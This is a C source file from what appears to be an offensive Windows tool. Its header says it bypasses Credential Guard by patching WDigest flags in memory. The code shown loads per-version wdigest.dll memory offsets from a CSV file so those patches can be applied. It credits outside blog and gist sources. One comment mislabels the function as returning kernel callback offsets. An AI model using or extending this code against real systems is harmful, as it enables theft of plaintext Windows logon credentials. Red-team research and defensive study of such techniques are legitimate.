/*

--- Functions to bypass Credential Guard by enabling Wdigest through patching of the g_fParameter_UseLogonCredential and g_IsCredGuardEnabled attributes in memory.
--- Full source and credit to https://teamhydra.blog/2020/08/25/bypassing-credential-guard/
--- Code adapted from: https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240

*/

#include <tchar.h>
#include <stdio.h>

#include "FileVersion.h"
#include "WdigestOffsets.h"

union WdigestOffsets wdigestOffsets = { 0 };

// Return the offsets of nt!PspCreateProcessNotifyRoutine, nt!PspCreateThreadNotifyRoutine, nt!PspLoadImageNotifyRoutine, and nt!_PS_PROTECTION for the specific Windows version in use.
union WdigestOffsets GetWdigestVersionOffsets(TCHAR* wdigestOffsetFilename) {
    TCHAR wdigestVersion[256] = { 0 };
    GetWdigestVersion(wdigestVersion);
    _tprintf(TEXT("[*] System's wdigest.dll file version is: %s\n"), wdigestVersion);

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, wdigestOffsetFilename, TEXT("r"));

    union WdigestOffsets offsetResults = { 0 };
    if (offsetFileStream == NULL) {
        _tprintf(TEXT("[!] Offset CSV file not found / invalid. A valid offset file must be specifed!\n"));
        return offsetResults;
    }

    TCHAR lineWdigestVersion[256];
    TCHAR line[2048];
    while (_fgetts(line, _countof(line), offsetFileStream)) {
        TCHAR* dupline = _tcsdup(line);
        TCHAR* tmpBuffer = NULL;
        _tcscpy_s(lineWdigestVersion, _countof(lineWdigestVersion), _tcstok_s(dupline, TEXT(","), &tmpBuffer));
        if (_tcscmp(wdigestVersion, lineWdigestVersion) == 0) {
            TCHAR* endptr;
            _tprintf(TEXT("[+] Offsets are available for this version of wdigest.dll (%s)!\n"), wdigestVersion);
            // TODO: switch hardcoded value to sizeof or const defined
            for (int i = 0; i < 2; i++) {
                offsetResults.ar[i] = _tcstoull(_tcstok_s(NULL, TEXT(","), &tmpBuffer), &endptr, 16);
            }
            break;
        }
    }
    fclose(offsetFileStream);
    return offsetResults;
}